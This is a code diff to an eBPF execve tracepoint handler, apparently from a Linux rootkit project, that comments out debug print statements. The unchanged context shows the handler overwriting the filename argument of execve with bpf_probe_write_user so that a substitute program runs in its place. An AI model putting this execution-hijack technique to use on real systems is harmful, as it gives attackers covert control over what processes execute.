@@ -120,7 +120,7 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
         bpf_printk("Error reading 3\n");
     };
 
-    bpf_printk("OLD ARGV0: %s\n", argv[0]);
+    /*bpf_printk("OLD ARGV0: %s\n", argv[0]);
     bpf_printk("ARGV1: %s\n", argv[1]);
     bpf_printk("ARGV2: %s\n", argv[2]);
     //bpf_printk("ENVP: %s\n", envp);
@@ -128,7 +128,7 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
     bpf_printk("&FILE: %llx, &ARGV0: %llx, &ARGV1: %llx\n", (void*)(ctx->filename), (void*)&(ctx->argv[0]), (void*)&(ctx->argv[1]));
     //bpf_printk("&ARGV: %llx, &ARGV0: %llx\n", ctx->argv, argv[0]);
     if((void*)ctx->filename==(void*)(ctx->argv)){
-        bpf_printk("Equal pointers");
+        //bpf_printk("Equal pointers");
     }else{
         //bpf_printk("Not equal pointers %u, %u", ctx->filename, ctx->argv);
     }
@@ -174,10 +174,10 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
 
     //Provided that the case error 2 may happen, we check if we are on that case before going ahead and overwriting everything.
     if(test_write_user_unique(ctx, (char*)filename, (char*)argv[0])!=0){
-        bpf_printk("Test failed\n");
+        //bpf_printk("Test failed\n");
         return -1;
     }else{
-        bpf_printk("Test completed\n");
+        //bpf_printk("Test completed\n");
     }
 
     if(bpf_probe_write_user((void*)(ctx->filename), (void*)to_write, (__u32)sizeof(PATH_EXECUTION_HIJACK_PROGRAM))<0){
